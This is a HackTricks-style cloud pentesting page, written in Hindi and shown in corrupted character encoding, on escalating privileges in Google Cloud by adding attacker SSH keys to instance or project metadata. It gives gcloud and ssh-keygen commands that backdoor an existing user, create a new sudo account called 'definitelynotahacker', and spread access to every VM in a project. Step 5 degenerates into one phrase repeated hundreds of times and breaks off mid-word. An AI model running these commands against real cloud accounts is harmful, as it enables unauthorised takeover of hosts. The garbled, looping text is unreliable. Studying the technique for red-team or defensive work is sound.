# GCP - рдЕрдкрдиреА рд╡рд┐рд╢реЗрд╖ SSH рдореЗрдЯрд╛рдбреЗрдЯрд╛ рдЬреЛрдбрд╝реЗрдВ

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert) рдХреЗ рд╕рд╛рде рдЬреАрд░реЛ рд╕реЗ рд╣реАрд░реЛ рддрдХ AWS рд╣реИрдХрд┐рдВрдЧ рд╕реАрдЦреЗрдВ</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

HackTricks рдХрд╛ рд╕рдорд░реНрдерди рдХрд░рдиреЗ рдХреЗ рдЕрдиреНрдп рддрд░реАрдХреЗ:

* рдЕрдЧрд░ рдЖрдк рдЕрдкрдиреА **рдХрдВрдкрдиреА рдХрд╛ рд╡рд┐рдЬреНрдЮрд╛рдкрди HackTricks рдореЗрдВ рджреЗрдЦрдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ** рдпрд╛ **HackTricks рдХреЛ PDF рдореЗрдВ рдбрд╛рдЙрдирд▓реЛрдб рдХрд░рдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ** рддреЛ [**рд╕рдмреНрд╕рдХреНрд░рд┐рдкреНрд╢рди рдкреНрд▓рд╛рдиреНрд╕**](https://github.com/sponsors/carlospolop) рджреЗрдЦреЗрдВ!
* [**рдЖрдзрд┐рдХрд╛рд░рд┐рдХ PEASS рдФрд░ HackTricks рд╕реНрд╡реИрдЧ**](https://peass.creator-spring.com) рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ
* рд╣рдорд╛рд░реЗ рд╡рд┐рд╢реЗрд╖ [**NFTs**](https://opensea.io/collection/the-peass-family) рд╕рдВрдЧреНрд░рд╣ [**The PEASS Family**](https://opensea.io/collection/the-peass-family) рдЦреЛрдЬреЗрдВ
* **рдЬреБрдбрд╝реЗрдВ** ЁЯТм [**рдбрд┐рд╕реНрдХреЙрд░реНрдб рд╕рдореВрд╣**](https://discord.gg/hRep4RUj7f) рдпрд╛ [**рдЯреЗрд▓реАрдЧреНрд░рд╛рдо рд╕рдореВрд╣**](https://t.me/peass) рд╕реЗ рдпрд╛ рд╣рдореЗрдВ **рдЯреНрд╡рд┐рдЯрд░** ЁЯРж [**@hacktricks_live**](https://twitter.com/hacktricks_live)** рдкрд░ рдлреЙрд▓реЛ** рдХрд░реЗрдВред
* **рд╣реИрдХрд┐рдВрдЧ рдЯреНрд░рд┐рдХреНрд╕ рд╕рд╛рдЭрд╛ рдХрд░реЗрдВ рдФрд░ PRs рд╕рдмрдорд┐рдЯ рдХрд░рдХреЗ** [**HackTricks**](https://github.com/carlospolop/hacktricks) рдФрд░ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos рдореЗрдВред

</details>

## рдореЗрдЯрд╛рдбреЗрдЯрд╛ рд╕рдВрд╢реЛрдзрди <a href="#modifying-the-metadata" id="modifying-the-metadata"></a>

рдПрдХ рдЗрдВрд╕реНрдЯреЗрдВрд╕ рдкрд░ рдореЗрдЯрд╛рдбреЗрдЯрд╛ рд╕рдВрд╢реЛрдзрди рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ рдЬреЛ рдпрджрд┐ рдХрд┐рд╕реА рд╣рдорд▓рд╛рд╡рд░ рдХреЛ рдЖрд╡рд╢реНрдпрдХ рдЕрдиреБрдорддрд┐рдпрд╛рдБ рдкреНрд░рд╛рдкреНрдд рд╣реЛ рдЬрд╛рдПрдВ рддреЛ **рдорд╣рддреНрд╡рдкреВрд░реНрдг рд╕реБрд░рдХреНрд╖рд╛ рдЬреЛрдЦрд┐рдореЛрдВ** рдХрд╛ рдХрд╛рд░рдг рдмрди рд╕рдХрддрд╛ рд╣реИред

### **рдХрд╕реНрдЯрдо рдореЗрдЯрд╛рдбреЗрдЯрд╛ рдореЗрдВ SSH рдХреБрдВрдЬрд┐рдпреЛрдВ рдХрд╛ рд╕рдорд╛рд╡реЗрд╢**

GCP рдкрд░, **Linux рд╕рд┐рд╕реНрдЯрдо** рдЕрдХреНрд╕рд░ [Python Linux Guest Environment for Google Compute Engine](https://github.com/GoogleCloudPlatform/compute-image-packages/tree/master/packages/python-google-compute-engine#accounts) рд╕реЗ рд╕реНрдХреНрд░рд┐рдкреНрдЯ рдЪрд▓рд╛рддреЗ рд╣реИрдВред рдЗрд╕рдХрд╛ рдПрдХ рдорд╣рддреНрд╡рдкреВрд░реНрдг рдШрдЯрдХ рд╣реИ [рдЦрд╛рддреЗ рдбреЗрдорди](https://github.com/GoogleCloudPlatform/compute-image-packages/tree/master/packages/python-google-compute-engine#accounts), рдЬреЛ рдЗрдВрд╕реНрдЯреЗрдВрд╕ рдореЗрдЯрд╛рдбреЗрдЯрд╛ рдПрдВрдбрдкреНрд╡рд╛рдЗрдВрдЯ рдкрд░ **рдЕрдзрд┐рдХреГрдд SSH рд╕рд╛рд░реНрд╡рдЬрдирд┐рдХ рдХреБрдВрдЬрд┐рдпреЛрдВ рдХреЗ рдЕрдкрдбреЗрдЯ рдХреЗ рд▓рд┐рдП рдирд┐рдпрдорд┐рдд рд░реВрдк рд╕реЗ рдЬрд╛рдВрдЪ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдбрд┐рдЬрд╝рд╛рдЗрди рдХрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИ**ред

рдЗрд╕рд▓рд┐рдП, рдпрджрд┐ рдХрд┐рд╕реА рд╣рдорд▓рд╛рд╡рд░ рдХреЛ рдХрд╕реНрдЯрдо рдореЗрдЯрд╛рдбреЗрдЯрд╛ рдореЗрдВ рд╕рдВрд╢реЛрдзрди рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рд╣реЛ, рддреЛ рд╡рд╣ рдбреЗрдорди рдПрдХ рдирдИ рд╕рд╛рд░реНрд╡рдЬрдирд┐рдХ рдХреБрдВрдЬреА рдЦреЛрдЬреЗрдЧрд╛, рдЬреЛ рд╕реНрдерд╛рдиреАрдп рд╕рд┐рд╕реНрдЯрдо рдореЗрдВ **рдПрдХреАрдХреГрдд рдХреА рдЬрд╛рдПрдЧреА**ред рдХреБрдВрдЬреА рдХреЛ **рдореМрдЬреВрджрд╛ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЗ `~/.ssh/authorized_keys` рдлрд╝рд╛рдЗрд▓ рдореЗрдВ рдЬреЛрдбрд╝ рджрд┐рдпрд╛ рдЬрд╛рдПрдЧрд╛ рдпрд╛ рд╕рдВрднрд╛рд╡рд┐рдд рд░реВрдк рд╕реЗ `sudo` рдЕрдзрд┐рдХрд╛рд░реЛрдВ рд╡рд╛рд▓реЗ рдирдП рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЛ рдмрдирд╛рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ**, рдХреБрдВрдЬреА рдХреЗ рдкреНрд░рд╛рд░реВрдк рдкрд░ рдирд┐рд░реНрднрд░ рдХрд░рддрд╛ рд╣реИред рдФрд░ рд╣рдорд▓рд╛рд╡рд░ рд╣реЛрд╕реНрдЯ рдХреЛ рдХрдВрдкреНрд░рдорд╛рдЗрдЬ рдХрд░ рд╕рдХреЗрдЧрд╛ред

### **рдореМрдЬреВрджрд╛ рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░реА рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдореЗрдВ SSH рдХреБрдВрдЬреА рдЬреЛрдбрд╝реЗрдВ**

1. **рдЗрдВрд╕реНрдЯреЗрдВрд╕ рдкрд░ рдореМрдЬреВрджрд╛ SSH рдХреБрдВрдЬрд┐рдпреЛрдВ рдХреА рдЬрд╛рдВрдЪ рдХрд░реЗрдВ:**
- рдЗрдВрд╕реНрдЯреЗрдВрд╕ рдФрд░ рдЙрд╕рдХреА рдореЗрдЯрд╛рдбреЗрдЯрд╛ рдХрд╛ рд╡рд┐рд╡рд░рдг рд╡рд┐рд╡рд░рдгрд┐рдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЖрджреЗрд╢ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд░реЗрдВ рддрд╛рдХрд┐ рдореМрдЬреВрджрд╛ SSH рдХреБрдВрдЬрд┐рдпреЛрдВ рдХреЛ рдвреВрдВрдврд╛ рдЬрд╛ рд╕рдХреЗред рдЙрддреНрдкрд╛рджрди рдореЗрдВ рд╕рдВрдмрдВрдзрд┐рдд рдЦрдВрдб `metadata` рдХреЗ рдЕрдВрддрд░реНрдЧрдд рд╣реЛрдЧрд╛, рд╡рд┐рд╢реЗрд╖ рд░реВрдк рд╕реЗ `ssh-keys` рдХреБрдВрдЬреА рдХреЗ рддрд╣рддред
```bash
gcloud compute instances describe [INSTANCE] --zone [ZONE]
```
- SSH рдХреБрдВрдЬрд┐рдпреЛрдВ рдХреЗ рдкреНрд░рд╛рд░реВрдк рдкрд░ рдзреНрдпрд╛рди рджреЗрдВ: рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреБрдВрдЬреА рдХреЗ рдЖрдЧреЗ рдХреБрдВрдЬреА рд╣реИ, рдЬреЛ рдПрдХ рдЕрдХреНрд╖рдорддрд╛ рджреНрд╡рд╛рд░рд╛ рдЕрд▓рдЧ рдХрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИред

2. **SSH рдХреБрдВрдЬреА рдореЗрдЯрд╛рдбреЗрдЯрд╛ рдХреЗ рд▓рд┐рдП рдПрдХ рдкрд╛рда рдлрд╝рд╛рдЗрд▓ рддреИрдпрд╛рд░ рдХрд░реЗрдВ:**
- рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛рдУрдВ рдХреЗ рд╡рд┐рд╡рд░рдг рдФрд░ рдЙрдирдХреА рд╕рдВрдмрдВрдзрд┐рдд SSH рдХреБрдВрдЬрд┐рдпреЛрдВ рдХреЛ `meta.txt` рдирд╛рдордХ рдПрдХ рдкрд╛рда рдлрд╝рд╛рдЗрд▓ рдореЗрдВ рд╕рд╣реЗрдЬреЗрдВред рдпрд╣ рдореМрдЬреВрджрд╛ рдХреБрдВрдЬрд┐рдпреЛрдВ рдХреЛ рд╕реБрд░рдХреНрд╖рд┐рдд рд░рдЦрдиреЗ рдХреЗ рд▓рд┐рдП рдЖрд╡рд╢реНрдпрдХ рд╣реИ рдЬрдмрдХрд┐ рдирдП рдХреБрдВрдЬрд┐рдпрд╛рдБ рдЬреЛрдбрд╝реА рдЬрд╛рддреА рд╣реИрдВред

3. **рд▓рдХреНрд╖рд┐рдд рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЗ рд▓рд┐рдП рдПрдХ рдирдИ SSH рдХреБрдВрдЬреА рдЙрддреНрдкрдиреНрди рдХрд░реЗрдВ (`рдПрд▓рд┐рд╕` рдЗрд╕ рдЙрджрд╛рд╣рд░рдг рдореЗрдВ):**
- рдирдИ SSH рдХреБрдВрдЬреА рдЙрддреНрдкрдиреНрди рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП `ssh-keygen` рдЖрджреЗрд╢ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░реЗрдВ, рд╕реБрдирд┐рд╢реНрдЪрд┐рдд рдХрд░реЗрдВ рдХрд┐ рдЯрд┐рдкреНрдкрдгреА рдХреНрд╖реЗрддреНрд░ (`-C`) рд▓рдХреНрд╖рд┐рдд рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рд╕реЗ рдореЗрд▓ рдЦрд╛рддрд╛ рд╣реИред
```bash
ssh-keygen -t rsa -C "alice" -f ./key -P "" && cat ./key.pub
```
- рдирдИ рд╕рд╛рд░реНрд╡рдЬрдирд┐рдХ рдХреБрдВрдЬреА рдХреЛ `meta.txt` рдореЗрдВ рдЬреЛрдбрд╝реЗрдВ, рдЗрдВрд╕реНрдЯреЗрдВрд╕ рдХреА рдореЗрдЯрд╛рдбреЗрдЯрд╛ рдореЗрдВ рдкрд╛рдП рдЬрд╛рдиреЗ рд╡рд╛рд▓реЗ рдкреНрд░рд╛рд░реВрдк рдХреА рддрд░рд╣ред

4. **рдЗрдВрд╕реНрдЯреЗрдВрд╕ рдХреА SSH рдХреБрдВрдЬреА рдореЗрдЯрд╛рдбреЗрдЯрд╛ рдХреЛ рдЕрдкрдбреЗрдЯ рдХрд░реЗрдВ:**
- `gcloud compute instances add-metadata` рдЖрджреЗрд╢ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдЗрдВрд╕реНрдЯреЗрдВрд╕ рдХреЛ рдЕрдкрдбреЗрдЯ рдХрд┐рдП рдЧрдП SSH рдХреБрдВрдЬреА рдореЗрдЯрд╛рдбреЗрдЯрд╛ рд▓рд╛рдЧреВ рдХрд░реЗрдВред
```bash
gcloud compute instances add-metadata [INSTANCE] --metadata-from-file ssh-keys=meta.txt
```

5. **рдирдИ SSH рдХреБрдВрдЬреА рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдЗрдВрд╕реНрдЯреЗрдВрд╕ рддрдХ рдкрд╣реБрдВрдЪреЗрдВ:**
- рдирдИ рдХреБрдВрдЬреА рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдЗрдВрд╕реНрдЯреЗрдВрд╕ рд╕реЗ SSH рдХреЗ рд╕рд╛рде рдХрдиреЗрдХреНрдЯ рдХрд░реЗрдВ, рд▓рдХреНрд╖рд┐рдд рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЗ рд╕рдВрджрд░реНрдн рдореЗрдВ рд╢реИрд▓ рдореЗрдВ рд╢реИрд▓ рдореЗрдВ рд╢реИрд▓ рдореЗрдВ рд╢реИрд▓ рдореЗрдВ рд╢реИрд▓ рдореЗрдВ рд╢реИрд▓ рдореЗрдВ рд╢реИрд▓ рдореЗрдВ рд╢реИрд▓ рдореЗрдВ рд╢реИрд▓ рдореЗрдВ рд╢реИрд▓ рдореЗрдВ рд╢реИрд▓ рдореЗрдВ рд╢реИрд▓ рдореЗрдВ рд╢реИрд▓ рдореЗрдВ рд╢реИрд▓ рдореЗрдВ рд╢реИрд▓ рдореЗрдВ рд╢реИрд▓ рдореЗрдВ рд╢реИрд▓ рдореЗрдВ рд╢реИрд▓ рдореЗрдВ рд╢реИрд▓ рдореЗрдВ рд╢реИрд▓ рдореЗрдВ рд╢реИрд▓ рдореЗрдВ рд╢реИрд▓ рдореЗрдВ рд╢реИрд▓ рдореЗрдВ рд╢реИрд▓ рдореЗрдВ рд╢реИрд▓ рдореЗрдВ рд╢реИрд▓ рдореЗрдВ рд╢реИрд▓ рдореЗрдВ рд╢реИрд▓ рдореЗрдВ рд╢реИрд▓ рдореЗрдВ рд╢реИрд▓ рдореЗрдВ рд╢реИрд▓ рдореЗрдВ рд╢реИрд▓ рдореЗрдВ рд╢реИрд▓ рдореЗрдВ рд╢реИрд▓ рдореЗрдВ рд╢реИрд▓ рдореЗрдВ рд╢реИрд▓ рдореЗрдВ рд╢реИрд▓ рдореЗрдВ рд╢реИрд▓ рдореЗрдВ рд╢реИрд▓ рдореЗрдВ рд╢реИрд▓ рдореЗрдВ рд╢реИрд▓ рдореЗрдВ рд╢реИрд▓ рдореЗрдВ рд╢реИрд▓ рдореЗрдВ рд╢реИрд▓ рдореЗрдВ рд╢реИрд▓ рдореЗрдВ рд╢реИрд▓ рдореЗрдВ рд╢реИрд▓ рдореЗрдВ рд╢реИрд▓ рдореЗрдВ рд╢реИрд▓ рдореЗрдВ рд╢реИрд▓ рдореЗрдВ рд╢реИрд▓ рдореЗрдВ рд╢реИрд▓ рдореЗрдВ рд╢реИрд▓ рдореЗрдВ рд╢реИрд▓ рдореЗрдВ рд╢реИрд▓ рдореЗрдВ рд╢реИрд▓ рдореЗрдВ рд╢реИрд▓ рдореЗрдВ рд╢реИрд▓ рдореЗрдВ рд╢реИрд▓ рдореЗрдВ рд╢реИрд▓ рдореЗрдВ рд╢реИрд▓ рдореЗрдВ рд╢реИрд▓ рдореЗрдВ рд╢реИрд▓ рдореЗрдВ рд╢реИрд▓ рдореЗрдВ рд╢реИрд▓ рдореЗрдВ рд╢реИрд▓ рдореЗрдВ рд╢реИрд▓ рдореЗрдВ рд╢реИрд▓ рдореЗрдВ рд╢реИрд▓ рдореЗрдВ рд╢реИрд▓ рдореЗрдВ рд╢реИрд▓ рдореЗрдВ рд╢реИрд▓ рдореЗрдВ рд╢реИрд▓ рдореЗрдВ рд╢реИрд▓ рдореЗрдВ рд╢реИрд▓ рдореЗрдВ рд╢реИрд▓ рдореЗрдВ рд╢реИрд▓ рдореЗрдВ рд╢реИрд▓ рдореЗрдВ рд╢реИрд▓ рдореЗрдВ рд╢реИрд▓ рдореЗрдВ рд╢реИрд▓ рдореЗрдВ рд╢реИрд▓ рдореЗрдВ рд╢реИрд▓ рдореЗрдВ рд╢реИрд▓ рдореЗрдВ рд╢реИрд▓ рдореЗрдВ рд╢реИрд▓ рдореЗрдВ рд╢реИрд▓ рдореЗрдВ рд╢реИрд▓ рдореЗрдВ рд╢реИрд▓ рдореЗрдВ рд╢реИрд▓ рдореЗрдВ рд╢реИрд▓ рдореЗрдВ рд╢реИрд▓ рдореЗрдВ рд╢реИрд▓ рдореЗрдВ рд╢реИрд▓ рдореЗрдВ рд╢реИрд▓ рдореЗрдВ рд╢реИрд▓ рдореЗрдВ рд╢реИрд▓ рдореЗрдВ рд╢реИрд▓ рдореЗрдВ рд╢реИрд▓ рдореЗрдВ рд╢реИрд▓ рдореЗрдВ рд╢реИрд▓ рдореЗрдВ рд╢реИрд▓ рдореЗрдВ рд╢реИрд▓ рдореЗрдВ рд╢реИрд▓ рдореЗрдВ рд╢реИрд▓ рдореЗрдВ рд╢реИрд▓ рдореЗрдВ рд╢реИрд▓ рдореЗрдВ рд╢реИрд▓ рдореЗрдВ рд╢реИрд▓ рдореЗрдВ рд╢реИрд▓ рдореЗрдВ рд╢реИрд▓ рдореЗрдВ рд╢реИрд▓ рдореЗрдВ рд╢реИрд▓ рдореЗрдВ рд╢реИрд▓ рдореЗрдВ рд╢реИрд▓ рдореЗрдВ рд╢реИрд▓ рдореЗрдВ рд╢реИрд▓ рдореЗрдВ рд╢реИрд▓ рдореЗрдВ рд╢реИрд▓ рдореЗрдВ рд╢реИрд▓ рдореЗрдВ рд╢реИрд▓ рдореЗрдВ рд╢реИрд▓ рдореЗрдВ рд╢реИрд▓ рдореЗрдВ рд╢реИрд▓ рдореЗрдВ рд╢реИрд▓ рдореЗрдВ рд╢реИрд▓ рдореЗрдВ рд╢реИрд▓ рдореЗрдВ рд╢реИрд▓ рдореЗрдВ рд╢реИрд▓ рдореЗрдВ рд╢реИрд▓ рдореЗрдВ рд╢реИрд▓ рдореЗрдВ рд╢реИрд▓ рдореЗрдВ рд╢реИрд▓ рдореЗрдВ рд╢реИрд▓ рдореЗрдВ рд╢реИрд▓ рдореЗрдВ рд╢реИрд▓ рдореЗрдВ рд╢реИрд▓ рдореЗрдВ рд╢реИрд▓ рдореЗрдВ рд╢реИрд▓ рдореЗрдВ рд╢реИрд▓ рдореЗрдВ рд╢реИрд▓ рдореЗрдВ рд╢реИрд▓ рдореЗрдВ рд╢реИрд▓ рдореЗрдВ рд╢реИрд▓ рдореЗрдВ рд╢реИрд▓ рдореЗрдВ рд╢реИрд▓ рдореЗрдВ рд╢реИрд▓ рдореЗрдВ рд╢реИрд▓ рдореЗрдВ рд╢реИрд▓ рдореЗрдВ рд╢реИрд▓ рдореЗрдВ рд╢реИрд▓ рдореЗрдВ рд╢реИрд▓ рдореЗрдВ рд╢реИрд▓ рдореЗрдВ рд╢реИрд▓ рдореЗрдВ рд╢реИрд▓ рдореЗрдВ рд╢реИрд▓ рдореЗрдВ рд╢реИрд▓ рдореЗрдВ рд╢реИрд▓ рдореЗрдВ рд╢реИрд▓ рдореЗрдВ рд╢реИрд▓ рдореЗрдВ рд╢реИрд▓ рдореЗрдВ рд╢реИрд▓ рдореЗрдВ рд╢реИрд▓ рдореЗрдВ рд╢реИрд▓ рдореЗрдВ рд╢реИрд▓ рдореЗрдВ рд╢реИрд▓ рдо
```bash
# define the new account username
NEWUSER="definitelynotahacker"

# create a key
ssh-keygen -t rsa -C "$NEWUSER" -f ./key -P ""

# create the input meta file
NEWKEY="$(cat ./key.pub)"
echo "$NEWUSER:$NEWKEY" > ./meta.txt

# update the instance metadata
gcloud compute instances add-metadata [INSTANCE_NAME] --metadata-from-file ssh-keys=meta.txt

# ssh to the new account
ssh -i ./key "$NEWUSER"@localhost
```
### рдкрд░рд┐рдпреЛрдЬрдирд╛ рд╕реНрддрд░ рдкрд░ SSH рдХреБрдВрдЬрд┐рдпрд╛рдБ <a href="#sshing-around" id="sshing-around"></a>

**рдкрд░рд┐рдпреЛрдЬрдирд╛ рд╕реНрддрд░ рдкрд░ SSH рдХреБрдВрдЬрд┐рдпрд╛рдБ рд▓рд╛рдЧреВ рдХрд░рдирд╛** рджреНрд╡рд╛рд░рд╛ рдПрдХ рдмрд╛рджрд▓ рдкрд░рд┐рд╡реЗрд╢ рдореЗрдВ рдХрдИ рд╡рд░реНрдЪреБрдЕрд▓ рдорд╢реАрди (VMs) рддрдХ SSH рдкрд╣реБрдВрдЪ рдХреЛ рд╡рд┐рд╕реНрддрд╛рд░рд┐рдд рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред рдпрд╣ рджреГрд╖реНрдЯрд┐рдХреЛрдг рдПрдХ рдкрд░рд┐рдпреЛрдЬрдирд╛ рдХреЗ рд╕реНрддрд░ рдкрд░ рдХрд┐рд╕реА рднреА рдЙрджрд╛рд╣рд░рдг рдореЗрдВ SSH рдкрд╣реБрдВрдЪ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддрд╛ рд╣реИ рдЬреЛ рдкрд░рд┐рдпреЛрдЬрдирд╛-рд╕реНрддрд░ рдХреА SSH рдХреБрдВрдЬрд┐рдпреЛрдВ рдХреЛ рд╕реНрдкрд╖реНрдЯ рд░реВрдк рд╕реЗ рдирд╣реАрдВ рдЕрд╡рд░реБрджреНрдзрд┐рдд рдХрд┐рдпрд╛ рд╣реИред рдпрд╣рд╛рдБ рдПрдХ рд╕рдВрдХреНрд╖реЗрдкрд┐рдд рдорд╛рд░реНрдЧрджрд░реНрд╢рд┐рдХрд╛ рд╣реИ:

1. **рдкрд░рд┐рдпреЛрдЬрдирд╛ рд╕реНрддрд░ рдкрд░ SSH рдХреБрдВрдЬрд┐рдпрд╛рдБ рд▓рд╛рдЧреВ рдХрд░реЗрдВ:**
- `gcloud compute project-info add-metadata` рдХрдорд╛рдВрдб рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░реЗрдВ рддрд╛рдХрд┐ `meta.txt` рд╕реЗ SSH рдХреБрдВрдЬрд┐рдпрд╛рдБ рдкрд░рд┐рдпреЛрдЬрдирд╛ рдХреА рдореЗрдЯрд╛рдбреЗрдЯрд╛ рдореЗрдВ рдЬреЛрдбрд╝ рд╕рдХреЗрдВред рдпрд╣ рдХрд╛рд░реНрд░рд╡рд╛рдИ рд╕реБрдирд┐рд╢реНрдЪрд┐рдд рдХрд░рддреА рд╣реИ рдХрд┐ SSH рдХреБрдВрдЬрд┐рдпрд╛рдБ рдкрд░рд┐рдпреЛрдЬрдирд╛ рдореЗрдВ рд╕рднреА VMs рдореЗрдВ рдорд╛рдиреНрдп рд╣реИрдВ, рдЬрдм рддрдХ рдХреЛрдИ VM "рдкрд░рд┐рдпреЛрдЬрдирд╛-рд╕реНрддрд░ рдХреА SSH рдХреБрдВрдЬрд┐рдпреЛрдВ рдХреЛ рдЕрд╡рд░реБрджреНрдз рдХрд░реЗрдВ" рд╡рд┐рдХрд▓реНрдк рд╕рдХреНрд╖рдо рдирд╣реАрдВ рдХрд░рддрд╛ рд╣реИред
```bash
gcloud compute project-info add-metadata --metadata-from-file ssh-keys=meta.txt
```

2. **рдкрд░рд┐рдпреЛрдЬрдирд╛-рд╕реНрддрд░ рдХреА рдХреБрдВрдЬрд┐рдпреЛрдВ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдЙрджрд╛рд╣рд░рдгреЛрдВ рдореЗрдВ SSH рдХрд░реЗрдВ:**
- рдкрд░рд┐рдпреЛрдЬрдирд╛-рд╕реНрддрд░ рдХреА SSH рдХреБрдВрдЬрд┐рдпрд╛рдБ рд▓рд╛рдЧреВ рд╣реЛрдиреЗ рдкрд░, рдЖрдк рдкрд░рд┐рдпреЛрдЬрдирд╛ рдХреЗ рднреАрддрд░ рдХрд┐рд╕реА рднреА рдЙрджрд╛рд╣рд░рдг рдореЗрдВ SSH рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред рдкрд░рд┐рдпреЛрдЬрдирд╛-рд╕реНрддрд░ рдХреБрдВрдЬрд┐рдпреЛрдВ рдХреЛ рдЕрд╡рд░реБрджреНрдзрд┐рдд рди рдХрд░рдиреЗ рд╡рд╛рд▓реЗ рдЙрджрд╛рд╣рд░рдг рд╕реНрд╡реАрдХрд╛рд░ рдХрд░реЗрдВрдЧреЗ, рдЬрд┐рд╕рд╕реЗ рдкрд╣реБрдВрдЪ рдорд┐рд▓реЗрдЧреАред
- рдПрдХ рдЙрджрд╛рд╣рд░рдг рдореЗрдВ SSH рдХрд░рдиреЗ рдХрд╛ рд╕реАрдзрд╛ рддрд░реАрдХрд╛ `gcloud compute ssh [INSTANCE]` рдХрдорд╛рдВрдб рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдирд╛ рд╣реИред рдпрд╣ рдХрдорд╛рдВрдб рдЖрдкрдХреЗ рд╡рд░реНрддрдорд╛рди рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдирд╛рдо рдФрд░ рдкрд░рд┐рдпреЛрдЬрдирд╛ рд╕реНрддрд░ рдкрд░ рд╕реЗрдЯ рдХреА рдЧрдИ SSH рдХреБрдВрдЬрд┐рдпреЛрдВ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рддрд╛ рд╣реИ рдкрд╣реБрдВрдЪ рдХреА рдХреЛрд╢рд┐рд╢ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдПред


# рд╕рдВрджрд░реНрдн
* [https://about.gitlab.com/blog/2020/02/12/plundering-gcp-escalating-privileges-in-google-cloud-platform/](https://about.gitlab.com/blog/2020/02/12/plundering-gcp-escalating-privileges-in-google-cloud-platform/)
